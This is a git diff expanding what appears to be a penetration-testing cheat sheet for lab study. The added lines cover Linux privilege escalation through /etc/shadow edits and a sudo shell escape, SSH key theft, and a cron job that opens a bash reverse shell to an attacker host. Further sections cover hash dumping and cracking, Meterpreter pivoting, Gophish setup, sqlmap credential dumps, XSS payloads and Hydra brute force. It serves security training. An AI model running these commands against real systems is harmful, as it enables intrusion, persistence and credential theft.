@@ -919,7 +919,7 @@ exploit
 # FTP
 ftp <TARGET_IP>
 
-ls -al /usr/share/nmap/scripts | grep ftp-*
+ls -lah /usr/share/nmap/scripts | grep ftp-*
 searchsploit ProFTPD
 ```
 
@@ -1223,7 +1223,7 @@ set TARGETURI /
 run
 
 # Pivoting to TARGET2 through TARGET1
-run autoroute -s <TARGET1_IP>
+run autoroute -s <TARGET1_SUBNET_NETWORK>
 background
 use auxiliary/scanner/portscan/tcp
 set RHOSTS <TARGET2_IP>
@@ -1410,7 +1410,7 @@ run
 
 ```bash
 # Automation
-ls -al /usr/share/metasploit-framework/scripts/resource
+ls -lah /usr/share/metasploit-framework/scripts/resource
 
 # Create a handler resource
 nano handler.rc
@@ -1571,7 +1571,7 @@ run
 # METERPRETER
 run post/windows/manage/migrate
 ## Pivoting
-portfwd add -l <LOCAL_PORT>  -p <TARGET_PORT> -r <TARGET_IP>
+portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
 ```
 
 ```bash
@@ -1864,7 +1864,7 @@ sudo armitage
 # BANNER GRABBING
 nmap -sV -O <TARGET_IP>
 nmap -sV --script=banner <TARGET_IP>
-ls -al /usr/share/nmap/scripts | grep <KEYWORD>
+ls -lah /usr/share/nmap/scripts | grep <KEYWORD>
 
 nc <TARGET_IP> <TARGET_OPEN_PORT>
 ```
@@ -2410,7 +2410,7 @@ df -h
 lsblk | grep sd
 
 whoami
-ls -al /home
+ls -lah /home
 cat /etc/passwd
 cat /etc/passwd | grep -v /nologin
 groups <USER>
@@ -2444,7 +2444,7 @@ use post/linux/gather/enum_network
 use post/linux/gather/enum_system
 use post/linux/gather/checkvm
 
-# LINENUM
+# LINENUM - Automatic Enumeration
 cd /tmp
 upload LinEnum.sh
 shell
@@ -2542,7 +2542,23 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -R
 ### Linux Privilege Escalation
 
 ```bash
-#
+# Writable files
+find / -not -type l -perm -o+w
+
+# e.g. of /etc/shadow with write permissions
+openssl passwd -1 -salt abc password123
+vim /etc/shadow # Paste the hashed password
+su
+
+# SETUID - SUDO privileges
+find / -user root -perm -4000 -exec ls -ldb {} \;
+find / -perm -u=s -type f 2>/dev/null
+
+sudo -l
+
+# e.g. User can run 'man' with SUDO Privileges
+sudo man ls
+	!/bin/bash
 ```
 
 ### Win Persistence
@@ -2563,19 +2579,77 @@ run getgui -e -u <NEWUSER> -p <PW>
 ### Linux Persistence
 
 ```bash
-#
+ls -lah ~/.ssh/
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/known_hosts
+
+# Download the 'id_rsa' file
+scp <USER>@<TARGET_IP>:~/.ssh/id_rsa .
+chmod 400 id_rsa
+
+ssh -i id_rsa <USER>@<TARGET_IP>
+
+# Cron Jobs
+cat /etc/cron*
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'" > cron
+crontab -i cron
+crontab -l
+
+# Setup a 'nc' listener and wait for the Bash Reverse Shell
+nc -nvlp <PORT>
 ```
 
 ### Dumping & Cracking
 
+#### Windows
+
 ```bash
-#
+hashdump
+
+# JohnTheRipper
+john --list=formats | grep NT
+john --format=NT hashes.txt
+
+gzip -d /usr/share/wordlists/rockyou.txt.gz
+john --format=NT win_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -a 3 -m 1000 --show hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+#### Linux
+
+```bash
+cat /etc/shadow
+
+# Metasploit
+use post/linux/gather/hashdump
+
+john --format=sha512crypt linux.hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Hashcat
+hashcat --help | grep 1800
+hashcat -a 3 -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ### Pivoting
 
 ```bash
-#
+# Meterpreter on Target1
+run autoroute -s <TARGET1_SUBNET_NETWORK>
+run autoroute -p
+background
+use auxiliary/scanner/portscan/tcp
+set RHOSTS <TARGET2_IP>
+set PORTS 1-100
+run
+
+# MeterpreterPort Forwarding
+portfwd add -l <LOCAL_PORT> -p <TARGET_PORT> -r <TARGET_IP>
+
+db_nmap -sS -sV -p <LOCAL_PORT> localhost
 ```
 
 ### Clearing Tracks
@@ -2604,13 +2678,104 @@ cat /dev/null > ~/.bash_history
 ## [Social Engineering](hostnetwork-penetration-testing/6-social-engineer.md)
 
 ```bash
-#
+# GOPHISH - Linux Install
+cd /opt/
+# Get the latest version link from https://github.com/gophish/gophish/releases/
+sudo wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+sudo unzip -d gophish gophish-v0.12.1-linux-64bit.zip
+sudo chmod +x gophish/gophish
+
+cd /opt/gophish && sudo ./gophish
+
+## Run in Docker instead
+docker run -ti -p 3333:3333 --rm gophish/demo
 ```
-
-
 
 ## [Web Application Penetration Testing](webapp-penetration-testing/1-webapp-http.md)
 
 ```bash
-#
+# TOOLS
+
+# Gobuster - Install
+sudo apt update && sudo apt install -y gobuster
+
+# BurpSuite - Install
+sudo apt update && sudo apt install -y burpsuite
+
+# SQLMap - Install
+sudo apt update && sudo apt install -y sqlmap
+
+# XSSer - Install
+sudo apt update && sudo apt install -y xsser
 ```
+
+```bash
+# Enumeration & Scanning
+nmap -sS -sV -p 80,443,3306 <TARGET_IP>
+
+# Dirbuster
+dirb http://<TARGET_IP>
+
+# CURL
+curl -I <TARGET_IP>
+curl -X GET <TARGET_IP>
+curl -X OPTIONS <TARGET_IP> -v
+curl -X POST <TARGET_IP>
+curl -X POST <TARGET_IP>/login.php -d "name=john&password=password" -v
+curl -X PUT <TARGET_IP>
+
+curl <TARGET_IP>/uploads/ --upload-file hello.txt
+curl -X DELETE <TARGET_IP>/uploads/hello.txt -v
+
+# Gobuster
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404
+
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
+
+gobuster dir -u http://<TARGET_IP>/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
+
+# Nikto
+nikto -h http://<TARGET_IP> -o niktoscan.txt
+
+nikto -h http://<TARGET_IP>/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm
+```
+
+```bash
+# Attacks
+
+# SQLMap
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title
+
+sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>
+
+## List databases
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs
+
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP --tables
+
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users --columns
+
+sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump
+
+
+# XSSer
+xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p
+'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
+
+xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p
+'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto
+
+xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"
+
+xsser --url "http://<TARGET_IP>/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=2&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"
+
+## Authenticated XSSer
+xsser --url "http://<TARGET_IP>/htmli_get.php?firstname=XSS&lastname=hi&form=submit" --cookie="PHPSESSID=lb3rg4q495t9sqph907sdhjgg1; security_level=0" --Fp "<script>alert(1)</script>"
+
+
+# Hydra - Basic auth attacks
+hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
+```
+
+------
+
